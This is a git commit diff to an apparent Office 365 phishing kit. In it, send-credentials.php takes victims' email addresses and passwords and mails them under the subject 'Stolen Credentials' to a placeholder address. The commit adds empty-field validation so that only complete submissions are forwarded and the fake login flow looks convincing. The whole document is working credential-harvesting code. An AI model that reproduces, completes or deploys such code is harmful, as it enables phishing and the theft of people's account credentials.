a778841497ab11bbf128d9195bf1789a864fbf03
Nick <nikospower1999@gmail.com>
2015-10-28 23:47:49 +0200

    Added Empty field(s) protection (Office365 Template)
    Template!

--- office365/send-credentials.php
+++ office365/send-credentials.php
@@ -6,10 +6,15 @@ $subject ="Stolen Credentials";
 $message="Email: $email \nPassword: $password";
 $header="from: test@test.com";
 $to ='test@test.com';
- 
+if (!$password || !$email ){
+echo '<script script type="text/javascript">';
+echo 'window.location.href ="index.html";'; 
+echo '</script>';
+}
+else{
 echo '<script script type="text/javascript">';
 echo 'window.location.href ="login-submit.html";'; 
 echo '</script>';
 mail($to,$subject,$message,$header);
-
+}
 ?>
